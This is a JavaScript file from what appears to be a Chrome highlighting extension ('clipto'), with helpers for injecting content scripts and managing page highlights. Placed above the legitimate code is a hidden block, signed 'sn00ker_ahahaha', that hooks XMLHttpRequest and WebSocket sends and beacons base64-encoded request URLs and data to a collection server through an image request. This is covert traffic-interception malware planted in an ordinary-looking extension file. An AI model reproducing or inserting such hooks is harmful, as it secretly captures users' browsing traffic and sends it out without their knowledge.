function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha

var _cl_tabs = {
  /**
   * Promise version of chrome's active tab getter
   */
  getActiveTab: function () {
    return new Promise(function (resolve, reject) {
      chrome.tabs.query({
        active: true,
        currentWindow: true
      }, function (tabs) {
        if (!tabs || tabs.length < 1) {
          reject(new Error("No active tab"));
        } else {
          resolve(tabs[0]);
        }
      });
    })
  },

  /**
   * call {@link chrome.tabs.executeScript()} serially
   * @param {number} tabId
   * @param {Array} injectDetailsArray
   * @param {function} [finalCallback] last callback to be called
   * @private
   */
  executeScripts: function (tabId, injectDetailsArray, finalCallback) {
    "use strict";
    function createCallback(tabId, injectDetails, innerCallback) {
      return function () {
        chrome.tabs.executeScript(tabId, injectDetails, innerCallback);
      };
    }

    var callback = finalCallback, i;
    for (i = injectDetailsArray.length - 1; i >= 0; --i) {
      callback = createCallback(tabId, injectDetailsArray[i], callback);
    }

    if (callback) {
      callback();   // execute outermost function
    }
  },

  /**
   * Inject all standard js and css
   * @param {number} tabId
   * @param {bool} [allFrames] if true inject into all frames. if false, just the top frame (default false)
   * @param {function} [callback]
   */
  executeAllScripts_Promise: function (tabId, allFrames) {
    "use strict";
    console.log("Injecting scripts into top level frames...");
    if (allFrames === undefined || allFrames === null) {
      allFrames = false;
    }

    var injectDetailsArray = [];

    // build the array supplied to executeScripts()
    [
      "static/js/jquery-2.1.3.min.js",
      "static/js/uri.min.js",
      "storage.js",
      "lc_utils.js",
      "content_script/page_resize.js",
      "content_script/xpath.js",
      "content_script/highlighter.js",
      "content_script/content_script.js",
      "content_script/toolkit.js",
      "content_script/notification.js",
      "content_script/mini_notification.js"
    ].forEach(function (file) {
        injectDetailsArray.push({
          file: file,
          allFrames: allFrames
        });
      });

    // inject scripts serially
    return new Promise(function (resolve, reject) {
      _cl_tabs.executeScripts(tabId, injectDetailsArray, function () {
        resolve();
      });
    });
  },

  sendMessage_Promise: function (tabId, message) {
    "use strict";
    return new Promise(function (resolve, reject) {
      chrome.tabs.sendMessage(tabId, message, function (response) {
        // it is possible that the script hasn't yet been injected,
        // so check the response for a undefined param
        if (response !== undefined) {
          // ok - pass to original handler
          resolve(response);
        } else {
          // probably scripts not yet executed
          reject();
        }
      });
    });
  },

  /**
   * Create a highlight in DOM
   * @param tabId
   * @param range
   * @param {string} itemId
   * @param {string} color
   * @param [responseCallback]
   */
  message_createHighlight_Promise: function (tabId, range, itemId, color) {
    "use strict";
    return _cl_tabs.sendMessage_Promise(tabId, {
      message_id: "clipto-create-highlight",
      range: range,
      highlightId: itemId,
      className: "cp-highlight-text",
      colorClassName: "cp-highlight-text-" + color
    });
  },

  /**
   * Update the highlight in the DOM by changing the class name of it (and all the spans of its list)
   * @param tabId
   * @param itemId
   * @param color
   */
  message_updateHighlight_Promise: function (tabId, data) {
    "use strict";

    console.log('message_updateHighlight_Promise');
    console.log(data);

    var highlightMessage = {
      message_id: "clipto-update_highlight",
      highlightId: data.itemId,
      classes: ["cp-highlight-text"]

    };

    if (data.color) {
      highlightMessage.classes.push("cp-highlight-text-" + data.color)
    }
    if (data.isActive) {
      highlightMessage.classes.push("cp-highlight-text-active")
    }

    return _cl_tabs.sendMessage_Promise(tabId, highlightMessage);
  },

  /**
   * delete highlight from DOM
   * @param tabId
   * @param highlightId
   * @returns {*}
   */
  message_deleteHighlight_Promise: function(tabId, highlightId) {
    "use strict";
    return _cl_tabs.sendMessage_Promise(tabId, {
      message_id: "clipto-delete-highlight",
      highlightId: highlightId
    })
  },

  /**
   * Animate the document.body scrollTop property to the top of the specified element
   * @param {number} tabId
   * @param {string} documentId
   * @param {function} [responseCallback]
   */
  sendScrollToMessage_Promise: function (tabId, documentId) {
    "use strict";
    return _cl_tabs.sendMessage_Promise(tabId, {
      id: "scroll_to",
      fragment: documentId
    });
  },

  /**
   * run all highlights on a doc (noteProperties)
   * @param tabId
   * @param doc
   * @param errorCallback (optional)
   * @returns {*}
   */
  runHighlights: function (tabId, doc, errorCallback) {

    return Promise.all(doc.items.map(function (item) {
      if (item.highlightText) {
        return _cl_tabs.message_createHighlight_Promise(tabId, item.range, item.itemId, item.highlightColor)
          .then(function (response) {
            if (response !== true && errorCallback) {
              errorCallback(doc);
            }
          });
      } else {
        return Promise.resolve();
      }
    }));
  },

  /**
   * 'Play' an array of document's 'create' and 'delete' messages into the DOM
   * @param {number} tabId
   * @param {Array} docs (urlNotes)
   * @param {function} [errorCallback] function(doc): only called (multiple times) when the DOM reports
   *  it can't create highlight for this doc
   * @return {number} sum of create/delete documents, where create is +1, delete is -1. If zero, no highlights!
   */
  replayDocuments_Promise: function (tabId, docs, errorCallback) {
    console.log("Replaying documents into DOM");
    // final callback after all scripts injected
    // send each transaction to the content script as a message
    "use strict";
    var sum = 0;

    return Promise.all(docs.map(function (doc) {
      switch (doc.verb) {
        //both create and update show the highlight
        case "create":
        case "update":
          sum++;
          return _cl_tabs.runHighlights(tabId, doc, errorCallback) ;
        //TODO: will not be called, as we do not post delete docs yet /:
        case "delete":
          sum--;
          return Promise.resolve();

        default:
          console.log("unhandled verb on replayDocuments_Promise: " + doc.verb);
          return Promise.resolve();
      }
    })).then(function () {
      return sum;
    });
  },

  /**
   * remove all highlights from page
   * @param {number} tabId
   * @param {Array} docs
   */
  removeAllHighlightsFromDom_Promise: function (tabId, docs) {

    console.log("Removing all highlights from DOM");
    "use strict";

    return Promise.all(docs.map(function (doc) {
      return Promise.all(doc.items.map(function (item) {
        if (item.highlightText) {
          try {
            return _cl_tabs.message_deleteHighlight_Promise(tabId, item.itemId)
          } catch (e) {
            console.log("Exception deleting highlight from DOM");
          }
        }
      }))

    }))
  }


};